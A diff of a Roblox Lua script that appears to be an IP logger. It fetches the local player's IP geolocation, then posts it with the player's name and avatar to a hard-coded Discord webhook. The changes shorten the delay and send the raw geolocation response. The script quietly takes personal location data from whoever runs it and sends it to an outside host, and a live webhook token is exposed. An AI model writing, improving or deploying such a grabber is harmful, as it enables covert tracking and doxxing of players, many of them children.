@@ -4,7 +4,7 @@ local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3C
 local player = game.Players.LocalPlayer
 local aaaaa = game:HttpGet("https://api.techniknews.net/ipgeo")
 
-wait(5)
+wait(1)
 
 local a = HTTP:JSONDecode(aaaaa)
 
@@ -15,7 +15,7 @@ local a = HTTP:JSONDecode(aaaaa)
 				["name"] = player.Name,
 				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
 			},
-			["description"] = "Info:  " .. a,
+			["description"] = "Info:  " .. aaaaa,
 			["color"] = tonumber(0xFFFAFA),
 			["fields"] = {
 				{
